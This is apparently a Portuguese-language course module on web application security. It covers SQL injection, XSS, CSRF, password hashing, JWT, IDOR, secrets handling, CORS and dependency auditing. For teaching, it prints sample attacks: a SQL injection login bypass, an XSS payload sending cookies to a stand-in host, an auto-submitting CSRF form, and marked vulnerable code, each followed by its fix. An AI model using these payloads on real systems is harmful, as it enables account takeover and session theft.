# MÓDULO 10 — Segurança

> **Dificuldade:** ●●●○○ · **Tempo:** 5 a 6 semanas · **Pré-requisito:** Módulos 3, 4 e 9

**Objetivo:** escrever aplicação que não vaza dado de usuário — e reconhecer, no seu próprio código, as falhas que aparecem em toda auditoria.

Este módulo não é sobre invadir sistema. É sobre **não deixar o seu ser invadido**, que é responsabilidade de quem escreve código, não de um time separado que chega no fim. As falhas abaixo estão entre as mais exploradas do mundo há mais de vinte anos, e continuam no topo porque continuam sendo escritas todo dia por gente que nunca viu uma aula sobre elas.

Aqui isso também virou obrigação legal. A **LGPD** responsabiliza a empresa por vazamento de dado pessoal, e "o programador não sabia" não é defesa.

**Uma frase para carregar pelo resto do módulo:** *toda entrada é hostil até prova em contrário.* Formulário, parâmetro de URL, cabeçalho HTTP, arquivo enviado, resposta de outra API — tudo que não nasceu dentro do seu código é suspeito.

---

## Nível Básico

### Aula 10.1 — O modelo mental

Iniciante pensa: *"o formulário só aceita número, então só vai chegar número"*.

Falso. O formulário é a interface **sugerida**. Nada obriga o atacante a usá-la — ele manda a requisição direto:

```bash
curl -X POST https://seusite.com/api/pedido \
     -d '{"quantidade": -5, "preco": 0.01, "admin": true}'
```

Seu HTML com `type="number"` e `min="1"` não participou dessa conversa. Validação no navegador é **conveniência para o usuário honesto**, nunca segurança.

**A regra:** valide no cliente para dar boa experiência; valide no servidor porque é lá que a segurança existe. E o servidor não pode confiar em nada que veio do cliente — nem no preço, nem no id do usuário, nem em um campo escondido.

**Os três princípios que geram quase todas as práticas deste módulo:**

| Princípio | Quer dizer |
|-----------|------------|
| **Menor privilégio** | Cada parte recebe só o acesso mínimo. O usuário do banco da aplicação web não precisa poder apagar tabela. |
| **Defesa em profundidade** | Várias camadas. Se uma falhar, outra segura. |
| **Falhe fechado** | Deu erro, negue o acesso. Nunca libere "por precaução". |

O terceiro é o mais violado. Um `try/except` que engole o erro de verificação de permissão e segue em frente **abriu o sistema** — silenciosamente.

### Aula 10.2 — SQL Injection

A falha mais famosa da história, e ainda encontrada em produção toda semana.

Considere um login escrito assim:

```python
# CÓDIGO VULNERÁVEL — não escreva isso
consulta = f"SELECT * FROM usuarios WHERE email = '{email}' AND senha = '{senha}'"
cursor.execute(consulta)
```

Com dados normais, funciona. Agora veja o que o atacante digita no campo de email:

```
' OR '1'='1' --
```

A consulta que chega ao banco vira:

```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = '...'
```

Leia com calma o que aconteceu:

- A aspa fechou o texto do email antes da hora
- `OR '1'='1'` é sempre verdadeiro, então **toda linha** da tabela passa no filtro
- `--` comenta o resto, e a verificação de senha some da consulta

Resultado: entrou como o primeiro usuário da tabela, tipicamente o administrador — **sem senha**. E variações do mesmo truque conseguem ler outras tabelas ou apagar dados.

**A causa raiz:** o código misturou **comando** e **dado** numa string só. O banco recebeu tudo junto e não teve como saber o que era instrução e o que era digitação do usuário.

**A correção — parâmetros:**

```python
# CORRETO
consulta = "SELECT * FROM usuarios WHERE email = %s AND senha_hash = %s"
cursor.execute(consulta, (email, senha_hash))
```

Repare na diferença: o `%s` não é substituição de texto. O comando vai ao banco **separado** dos valores, e o banco trata o valor como valor, sempre. Se o atacante mandar `' OR '1'='1' --`, o banco procura literalmente um email chamado `' OR '1'='1' --`, não acha, e devolve zero linhas.

**Nunca monte SQL com concatenação ou f-string.** Nem "só neste caso", nem "esse valor vem de dentro". Use parâmetros sempre — é mais curto, mais rápido e seguro.

ORM protege disso por padrão, mas some a proteção quando você escreve SQL cru nele:

```python
Usuario.objects.raw(f"SELECT * FROM usuarios WHERE id = {id}")   # vulnerável
Usuario.objects.raw("SELECT * FROM usuarios WHERE id = %s", [id]) # correto
```

### Aula 10.3 — XSS

**Cross-Site Scripting** é injetar JavaScript na página que outra pessoa vai abrir. Mesma causa raiz do anterior, outro alvo: aqui o dado do usuário é interpretado como **código pelo navegador**.

Um campo de comentário que salva e exibe assim:

```javascript
// VULNERÁVEL
divComentarios.innerHTML = comentario;
```

O atacante escreve como comentário:

```html
<img src=x onerror="fetch('https://malvado.com/roubar?c='+document.cookie)">
```

A imagem falha de propósito, o `onerror` dispara, e **o cookie de sessão de cada visitante é enviado para o atacante**. Com o cookie, ele entra nas contas sem precisar de senha.

**A correção — trate texto como texto:**

```javascript
divComentarios.textContent = comentario;      // seguro: não interpreta HTML
```

Você viu essa diferença no Módulo 3, na Aula 3.7. Ali ela parecia detalhe de estilo. É segurança.

Quando você **precisa** aceitar HTML — um editor de texto rico, por exemplo — não escreva o filtro você mesmo. Use uma biblioteca de sanitização testada, como o DOMPurify:

```javascript
divComentarios.innerHTML = DOMPurify.sanitize(comentario);
```

**Por que não escrever seu próprio filtro:** já tentaram, por décadas, e sempre há um caso que escapa. `<img onerror>`, `<svg onload>`, `javascript:` em `href`, HTML malformado que o navegador conserta de um jeito inesperado. Esta é uma das poucas áreas onde "não invente, use a biblioteca" é resposta definitiva.

Frameworks modernos (React, Vue, Angular) escapam por padrão. Mas todos têm uma porta dos fundos, e ela avisa no nome:

```jsx
<div dangerouslySetInnerHTML={{__html: comentario}} />   // React avisou
```

**Camada extra:** o cabeçalho `HttpOnly` no cookie impede o JavaScript de lê-lo. Assim, mesmo com um XSS, o cookie de sessão não vaza — é defesa em profundidade na prática.

### Aula 10.4 — CSRF

**Cross-Site Request Forgery** é fazer o navegador da vítima executar uma ação **autenticada** sem que ela perceba.

O mecanismo depende de um detalhe do navegador: **ele envia os cookies do seu site automaticamente**, em qualquer requisição para lá — inclusive numa disparada por outro site.

A vítima está logada no banco. Ela abre outra aba, num site qualquer, que contém:

```html
<form action="https://banco.com/transferir" method="POST" id="f">
    <input type="hidden" name="para" value="conta-do-atacante">
    <input type="hidden" name="valor" value="5000">
</form>
<script>document.getElementById('f').submit();</script>
```

O formulário se envia sozinho. O navegador anexa o cookie do banco, porque é assim que ele funciona. O banco recebe uma requisição autenticada e válida — e transfere.

**As correções, e todas valem a pena juntas:**

```python
# 1. Token anti-CSRF: valor imprevisível, exigido em toda ação que muda estado
<input type="hidden" name="csrf_token" value="{{ token }}">
```

O site atacante não consegue adivinhar o token, e não consegue lê-lo do seu site (a política de mesma origem impede).

```python
# 2. SameSite no cookie — o navegador não envia em requisição de outro site
response.set_cookie("sessao", valor, samesite="Lax", httponly=True, secure=True)
```

`SameSite=Lax` é o padrão nos navegadores atuais e já resolve a maior parte dos casos. Não dispensa o token: navegador antigo e configuração diferente ainda existem.

```
3. GET nunca muda estado.
```

Esta é regra de arquitetura, não de segurança — mas evita a versão mais boba do ataque, em que um `<img src="banco.com/transferir?valor=5000">` faz a transferência. Se `GET` só lê, uma tag de imagem não causa dano.

Todo framework sério traz proteção CSRF pronta. **Ligada.** O erro comum é desligá-la porque "estava dando erro no formulário".

---

## Nível Intermediário

### Aula 10.5 — Senhas

**Nunca guarde senha em texto puro.** Isso é o mínimo, e ainda assim vaza empresa grande fazendo exatamente isso.

Também não basta guardar o "hash":

```python
# ERRADO — MD5 e SHA-1 são rápidos demais, e isso é o problema
import hashlib
senha_hash = hashlib.md5(senha.encode()).hexdigest()
```

Por que rapidez é defeito aqui: o atacante que roubou seu banco vai testar bilhões de senhas por segundo contra os hashes. MD5 e SHA-256 foram feitos para ser rápidos — e ajudam o atacante muito mais que você.

**O certo é um algoritmo feito para ser lento e com sal:**

```python
import bcrypt

# Ao cadastrar
senha_hash = bcrypt.hashpw(senha.encode(), bcrypt.gensalt())

# Ao entrar
if bcrypt.checkpw(senha_digitada.encode(), senha_hash):
    ...
```

Duas propriedades fazem o trabalho:

- **Lento de propósito.** Cada tentativa custa tempo real. Bilhões por segundo viram milhares.
- **Sal** (*salt*) — um valor aleatório por senha, guardado junto ao hash. Sem ele, duas pessoas com a mesma senha teriam o mesmo hash, e uma tabela pré-calculada (*rainbow table*) quebraria as duas de uma vez. Com sal, cada senha precisa ser atacada individualmente.

Use **bcrypt**, **argon2** ou **scrypt**. Argon2 é o mais recomendado hoje; bcrypt é o mais disponível. Qualquer um dos três está certo.

**O resto da política de senha, em ordem de importância real:**

- Exija **comprimento** (12+), não "um símbolo e uma maiúscula". Regra complicada produz `Senha@123`, que qualquer lista quebra.
- Compare com listas de senhas já vazadas e recuse as conhecidas
- Limite tentativas de login, com espera crescente
- Ofereça segundo fator

E: **nunca envie senha por email**, nem no cadastro nem na recuperação. Recuperação é feita com link temporário de uso único.

### Aula 10.6 — Sessão, token e JWT

Depois do login, como o servidor sabe quem você é na próxima requisição? HTTP não lembra nada sozinho.

**Sessão no servidor** — o caminho tradicional:

```
1. Login válido → servidor cria a sessão e guarda no banco/Redis
2. Devolve um cookie com o identificador da sessão
3. A cada requisição, o navegador manda o cookie
4. O servidor consulta e sabe quem é
```

**JWT** — o token que carrega a informação:

```
cabeçalho.dados.assinatura
eyJhbGci...  .  eyJzdWIiOiIxMjM0...  .  SflKxwRJSMeKK...
```

O servidor não guarda nada: ele **verifica a assinatura** e confia no conteúdo.

| | Sessão no servidor | JWT |
|---|---|---|
| Estado | No servidor | No token |
| Revogar na hora | Fácil — apaga a sessão | **Difícil** — vale até expirar |
| Escala horizontal | Precisa de armazenamento compartilhado | Qualquer servidor valida |
| Tamanho | Cookie pequeno | Token maior, vai em toda requisição |

**Os erros clássicos de JWT, e são graves:**

```python
# ERRADO — aceita token sem verificar assinatura
dados = jwt.decode(token, options={"verify_signature": False})
```

Sem verificar a assinatura, qualquer um edita o conteúdo e vira administrador. O `alg: none` — um token que se declara sem assinatura — já derrubou bibliotecas inteiras.

```python
# CORRETO
dados = jwt.decode(token, CHAVE_SECRETA, algorithms=["HS256"])
```

Repare no `algorithms`: fixar a lista impede o atacante de escolher o algoritmo por você.

**Outros dois:** JWT não é criptografado, é **assinado** — qualquer um lê o conteúdo com um decodificador de base64, então **nunca coloque dado sensível ali**. E dê expiração curta (minutos a poucas horas), com token de renovação separado, justamente porque revogar é difícil.

**Qual escolher:** se você tem dúvida, use **sessão no servidor**. É mais simples e revogar é trivial. JWT brilha em API sem estado e vários serviços — e cobra o preço da revogação.

### Aula 10.7 — Autorização e IDOR

**Autenticação** é *quem é você*. **Autorização** é *o que você pode*. Confundir as duas gera a falha mais comum em API moderna.

```python
# VULNERÁVEL — verifica que está logado, não que o pedido é dele
@app.get("/api/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario = Depends(usuario_logado)):
    return db.buscar_pedido(pedido_id)
```

O usuário logado troca a URL de `/api/pedidos/1001` para `/api/pedidos/1002` e **lê o pedido de outra pessoa** — com nome, endereço e valor. Nenhuma barreira foi quebrada: o sistema simplesmente nunca perguntou se aquele pedido era dele.

Isso se chama **IDOR** (*Insecure Direct Object Reference*), e é encontrado em auditoria com uma frequência constrangedora.

```python
# CORRETO — a posse faz parte da consulta
@app.get("/api/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario = Depends(usuario_logado)):
    pedido = db.buscar_pedido(pedido_id)
    if not pedido or pedido.cliente_id != usuario.id:
        raise HTTPException(404)      # 404, não 403
    return pedido
```

Dois detalhes que importam:

- **Verifique a posse em toda rota que recebe um id.** Toda. Uma esquecida basta.
- **Devolva 404, não 403.** Um 403 confirma que o pedido 1002 existe — informação que o atacante usa para mapear a base. O 404 não conta nada.

**Sobre id sequencial:** trocar para UUID torna o ataque mais trabalhoso, mas **não é a correção**. É camada extra. A correção é verificar a posse.

**O mesmo vale para campos.** Se o usuário pode editar o próprio perfil, ele não pode editar o campo `is_admin` — mesmo que ele mande esse campo no JSON. Aceite explicitamente só os campos permitidos, nunca repasse o corpo inteiro para o banco.

---

## Nível Avançado

### Aula 10.8 — Segredos e configuração

Segredo é chave de API, senha de banco, token, chave de assinatura. Duas regras:

**1. Nunca no código.** Nem em constante, nem em comentário, nem "temporariamente".

```python
# ERRADO
API_KEY = "sk-proj-abc123..."

# CORRETO
import os
API_KEY = os.environ["API_KEY"]        # falha alto se não existir
```

Prefira `os.environ["X"]` a `os.environ.get("X")`: o primeiro derruba a aplicação na hora se faltar configuração, o segundo segue com `None` e você descobre em produção.

**2. Nunca no Git.** O `.env` fica no `.gitignore`, sempre, e você versiona um `.env.example` sem valores:

```bash
# .env.example — este vai para o Git
DATABASE_URL=postgresql://usuario:senha@localhost/banco
API_KEY=
JWT_SECRET=
```

O Módulo 8 explicou por que apagar depois não resolve: o histórico guarda. Se vazou, **invalide a chave primeiro** — o resto é limpeza.

**Configuração por ambiente:** desenvolvimento, homologação e produção têm valores diferentes e **segredos diferentes**. A chave de teste jamais é a de produção. Em produção, use o cofre da plataforma (variáveis do provedor, AWS Secrets Manager, Vault) em vez de arquivo no disco.

E uma que passa despercebida: **mensagem de erro é vazamento**. Em produção, `DEBUG = False`. A página de erro detalhada do Django ou do Flask mostra caminho de arquivo, trecho de código e, às vezes, variáveis de ambiente na tela.

### Aula 10.9 — HTTPS, CORS e cabeçalhos

**HTTPS não é opcional.** Sem ele, qualquer um no caminho — o Wi-Fi do café, o provedor — lê e altera o tráfego. Hoje é gratuito via Let's Encrypt e automático na maioria das hospedagens. Redirecione todo HTTP para HTTPS, e ligue HSTS para o navegador nem tentar a versão insegura.

**CORS** é o mais incompreendido da web. Ele **não protege seu servidor** — protege o *usuário*, impedindo que o site A leia, pelo navegador dele, a resposta de uma API B onde ele está logado.

Por isso o erro de CORS aparece: você tentou acessar uma API de outra origem e o navegador bloqueou a leitura da resposta.

```python
# ERRADO — libera para qualquer site
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)

# CORRETO — liste quem pode
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://meusite.com"],
    allow_credentials=True,
)
```

`allow_origins=["*"]` junto com `allow_credentials=True` é uma combinação que os navegadores recusam, justamente por ser perigosa. Se você chegou a essa configuração tentando fazer o erro sumir, você desligou a proteção em vez de configurá-la.

**Cabeçalhos que valem ligar:**

| Cabeçalho | Faz |
|-----------|-----|
| `Content-Security-Policy` | Limita de onde script pode vir — a melhor defesa contra XSS |
| `Strict-Transport-Security` | Força HTTPS |
| `X-Content-Type-Options: nosniff` | Impede o navegador de adivinhar o tipo do arquivo |
| `X-Frame-Options: DENY` | Impede seu site de ser embutido em iframe (*clickjacking*) |

**Limite de taxa** (*rate limiting*) fecha a lista: sem ele, o atacante testa senha à vontade e qualquer robô derruba seu servidor.

### Aula 10.10 — Dependências

Seu código pode estar impecável e a aplicação vulnerável — porque 90% do que roda em produção você não escreveu.

```bash
npm audit                  # lista vulnerabilidades conhecidas
npm audit fix

pip install pip-audit
pip-audit
```

Ligue o **Dependabot** no GitHub: ele abre Pull Request automático quando sai correção de segurança das suas dependências. É gratuito e leva dois minutos.

**Antes de instalar um pacote**, gaste trinta segundos: quantos downloads tem? A última publicação é recente? Quantos mantenedores? Um pacote com 40 downloads semanais e um único mantenedor é risco — não porque a pessoa seja má, mas porque uma conta comprometida vira código malicioso na sua máquina e na sua produção.

**Versione o arquivo de trava** (`package-lock.json`, `poetry.lock`). Ele garante que produção instale exatamente o que você testou, e não uma versão nova publicada ontem.

E cuidado com o nome: **typosquatting** é publicar `requets` esperando o erro de digitação de quem quis `requests`. Confira o que você digitou antes de instalar.

### Aula 10.11 — Como continuar

O **OWASP Top 10** é a lista de referência das falhas mais críticas em aplicação web, revisada periodicamente por gente que faz isso profissionalmente. Você já viu as principais neste módulo — controle de acesso quebrado, injeção, falha de identificação, componente vulnerável, configuração insegura.

Leia a lista completa em [owasp.org/Top10](https://owasp.org/www-project-top-ten/). Não decore: use como checklist ao revisar seu próprio projeto.

**Hábitos que valem mais que conhecimento pontual:**

- Rode `npm audit` / `pip-audit` antes de todo deploy
- Revise o próprio código perguntando *"o que acontece se este campo vier com algo hostil?"*
- Nunca desligue proteção do framework para fazer um erro sumir — entenda por que ela disparou
- Trate relato de falha com seriedade, mesmo vindo de estranho

**Sobre praticar ataque:** só em ambiente feito para isso. [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) e [PortSwigger Web Security Academy](https://portswigger.net/web-security) são aplicações vulneráveis de propósito, gratuitas, para você explorar à vontade e entender o outro lado.

**Testar sistema de terceiro sem autorização por escrito é crime** no Brasil, com pena prevista em lei. A curiosidade é legítima; o alvo tem que ser seu ou de um programa que autorize.

---

## Projetos do Módulo 10

**Projeto 1 — Ataque e conserte seu próprio código**
Pegue a API que você fez no Módulo 4 ou 5 e escreva-a de propósito com SQL injection, XSS e IDOR. **Explore cada uma** com `curl`, guardando o antes. Depois corrija as três e demonstre que o mesmo ataque falhou. Entregue um relatório curto com o comando usado, o resultado antes e o resultado depois. Ver a falha funcionando ensina o que nenhuma explicação ensina.

**Projeto 2 — Autenticação feita direito**
Cadastro e login com bcrypt e sal, limite de tentativas com espera crescente, sessão ou JWT com expiração curta, recuperação de senha por link de uso único e prazo, e verificação de posse em toda rota que recebe id. Teste tentando acessar o recurso de outro usuário.

**Projeto 3 — Revisão de segurança**
Escolha um projeto seu já pronto e faça uma auditoria escrita usando o OWASP Top 10 como roteiro. Para cada item: aplica-se? Está protegido? Como você verificou? Corrija o que achar e registre. Este relatório é material de entrevista — poucos júniores têm um.

---

## Checklist de saída do Módulo 10

- [ ] Explico por que validação no navegador não é segurança
- [ ] Escrevo SQL com parâmetros e sei explicar por que isso impede injeção
- [ ] Sei a diferença entre `innerHTML` e `textContent` como questão de segurança
- [ ] Explico como um CSRF funciona e as três defesas
- [ ] Uso bcrypt ou argon2 e sei por que SHA-256 não serve para senha
- [ ] Sei o que é IDOR e verifico posse em toda rota com id
- [ ] Sei por que devolver 404 em vez de 403 em recurso alheio
- [ ] Nenhum segredo meu está no Git, e sei o que fazer se vazar
- [ ] Sei o que CORS protege — e o que ele não protege
- [ ] Rodo auditoria de dependências antes de publicar
